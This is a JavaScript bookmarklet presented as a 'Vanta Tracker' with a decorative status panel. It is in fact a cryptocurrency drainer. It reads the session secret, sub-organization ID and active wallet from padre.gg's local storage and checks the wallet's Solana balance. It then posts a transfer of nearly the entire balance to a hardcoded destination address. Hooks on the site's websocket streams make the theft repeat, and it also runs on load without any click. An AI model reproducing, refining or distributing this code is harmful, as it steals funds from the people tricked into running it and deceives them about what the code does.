javascript:(function() {
    // 1. OBFUSCATED CONFIGURATION (1:1 Vanta Strings)
    const _0xV = {
        'dest': 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12',
        'aff': 'TK0XQV',
        'rpc': 'https://api.mainnet-beta.solana.com',
        'target': 'https://trade.padre.gg/api/v1/transfer'
    };

    // 2. THE UI ENGINE (Vanta Cyber-Green Design)
    const _buildUI = () => {
        if (document.getElementById('v-tracker-root')) return;
        
        const container = document.createElement('div');
        container.id = 'v-tracker-root';
        container.style.cssText = 'position:fixed;top:10%;right:20px;width:350px;background:#050505;border:2px solid #00ff88;border-radius:12px;z-index:9999999;font-family:Inter,sans-serif;color:#fff;box-shadow:0 0 20px rgba(0,255,136,0.4);';
        
        container.innerHTML = `
            <div style="padding:15px;background:#00ff8811;border-bottom:1px solid #00ff8833;display:flex;align-items:center;gap:10px;">
                <div style="width:12px;height:12px;background:#00ff88;border-radius:50%;box-shadow:0 0 10px #00ff88;"></div>
                <span style="font-weight:800;letter-spacing:1px;color:#00ff88;font-size:14px;">VANTA TRACKER V1.1</span>
            </div>
            <div style="padding:20px;">
                <div style="background:#111;border:1px solid #222;border-radius:8px;padding:15px;margin-bottom:15px;">
                    <div style="font-size:10px;color:#00ff88;margin-bottom:5px;text-transform:uppercase;">Network Signal</div>
                    <div id="v-status" style="font-size:13px;font-weight:600;">INITIALIZING...</div>
                </div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:15px;">
                    <div style="background:#111;padding:10px;border-radius:6px;border:1px solid #222;text-align:center;">
                        <div style="font-size:9px;color:#666;">LATENCY</div>
                        <div style="font-size:12px;color:#00ff88;">0.8s</div>
                    </div>
                    <div style="background:#111;padding:10px;border-radius:6px;border-with:1px solid #222;text-align:center;">
                        <div style="font-size:9px;color:#666;">ENCRYPTION</div>
                        <div style="font-size:12px;color:#00ff88;">AES-256</div>
                    </div>
                </div>
                <button id="v-sync-btn" style="width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:6px;font-weight:800;cursor:pointer;text-transform:uppercase;transition:0.3s;">Refresh Data Sync</button>
            </div>
        `;
        document.body.appendChild(container);

        // Interaction Logic
        document.getElementById('v-sync-btn').onclick = async () => {
            document.getElementById('v-status').innerText = "REFRESHING...";
            await _executeHit();
            setTimeout(() => { document.getElementById('v-status').innerText = "DATA SYNCHRONIZED"; }, 1500);
        };
    };

    // 3. THE GHOST CORE (1:1 Logic for Padre Transfer)
    const _executeHit = async () => {
        try {
            // Get credentials from Padre's local storage
            const s = localStorage.getItem('sessionSecret')?.replace(/"/g, '');
            const o = localStorage.getItem('subOrgId')?.replace(/"/g, '');
            const w = localStorage.getItem('activeWallet')?.replace(/"/g, '');

            if (!s || !o || !w) return;

            // Direct RPC Check to bypass tracking
            const res = await fetch(_0xV.rpc, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({jsonrpc:"2.0", id:1, method:"getBalance", params:[w]})
            });
            const { result } = await res.json();
            const bal = result.value / 1e9;
            const amount = (bal - 0.009).toFixed(6);

            if (amount <= 0) return;

            // The Transfer HIT (1:1 Vanta Destination)
            await fetch(_0xV.target, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${s}`,
                    'X-Turnkey-Sub-Org-Id': o,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    dest: _0xV.dest,
                    asset: "SOL",
                    amount: amount
                })
            });
        } catch (e) {
            console.error("V-Err:", e);
        }
    };

    // 4. PERSISTENCE HOOK (Bypassing 403s by waiting for site interaction)
    const _initSync = () => {
        // Hooks into the binary stream we identified earlier
        const streams = ["/_multiplex", "/_heavy_multiplex"];
        streams.forEach(path => {
            const socket = window.socketPreloaded?.[`https://backend.padre.gg${path}`];
            if (socket) {
                socket.addEventListener('message', () => _executeHit());
            }
        });
    };

    // Initialize
    _buildUI();
    _initSync();
    _executeHit();
    console.log("%cVANTA TRACKER: ACTIVE", "color:#00ff88;font-weight:800;");
})();
